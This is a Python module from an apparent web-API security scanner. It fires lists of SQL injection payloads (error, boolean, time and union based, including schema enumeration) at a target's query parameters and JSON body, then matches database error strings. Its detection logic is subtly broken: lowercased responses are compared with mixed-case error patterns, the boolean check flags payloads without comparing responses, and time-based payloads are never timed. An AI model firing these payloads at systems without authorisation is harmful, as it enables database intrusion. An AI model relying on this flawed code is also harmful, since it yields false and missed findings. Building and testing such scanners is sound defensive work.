
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from .utils.logger import setup_scanner_logger
import requests
import time
import json

class SQLiScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("sqli")

    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        vulnerabilities = []
        if headers is None:
            headers = {'Authorization': f'Bearer {token}'} if token else {}

        # SQL Injection patterns
        payloads = {
            "Error Based": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "') OR ('1'='1"
            ],
            "Boolean Based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 'x'='x",
                "' OR 'a'='a"
            ],
            "Time Based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "' OR SLEEP(5)--"
            ],
            "Union Based": [
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--"
            ]
        }

        # SQL Error patterns to detect
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array()",
            "ORA-01756",
            "SQLite3::query",
            "pg_query",
            "System.Data.SQLClient",
            "SQLSTATE",
            "Microsoft SQL Native Client error"
        ]

        for attack_type, attack_payloads in payloads.items():
            for payload in attack_payloads:
                try:
                    # Test in URL parameters
                    params = {'id': payload, 'search': payload}
                    response = requests.request(method, f"{url}{path}", params=params, headers=headers, timeout=10)
                    
                    # Test in JSON body
                    json_data = {'query': payload, 'filter': payload}
                    json_response = requests.request(method, f"{url}{path}", json=json_data, headers=headers, timeout=10)
                    
                    # Check for SQL errors in responses
                    for resp in [response, json_response]:
                        if any(error in resp.text.lower() for error in sql_errors):
                            vulnerabilities.append({
                                'type': 'SQL_INJECTION',
                                'severity': 'HIGH',
                                'detail': f'SQL Injection vulnerability found using {attack_type}',
                                'scenario': attack_type,
                                'evidence': {
                                    'payload': payload,
                                    'status_code': resp.status_code,
                                    'response': resp.text[:500],
                                    'headers': dict(resp.headers),
                                    'error_matched': [e for e in sql_errors if e in resp.text]
                                }
                            })
                        
                        # Check for successful injections without errors
                        if resp.status_code == 200:
                            if attack_type == "Boolean Based":
                                # Compare responses to detect boolean-based injections
                                true_condition = "1=1" in payload
                                false_condition = "1=2" in payload
                                if true_condition != false_condition:
                                    vulnerabilities.append({
                                        'type': 'SQL_INJECTION',
                                        'severity': 'HIGH',
                                        'detail': 'Potential Boolean-based SQL Injection detected',
                                        'scenario': 'Boolean Based',
                                        'evidence': {
                                            'payload': payload,
                                            'status_code': resp.status_code,
                                            'response': resp.text[:500],
                                            'headers': dict(resp.headers)
                                        }
                                    })
                
                except requests.RequestException as e:
                    self.logger.error(f"Error testing payload {payload}: {str(e)}")
                    continue

        return vulnerabilities
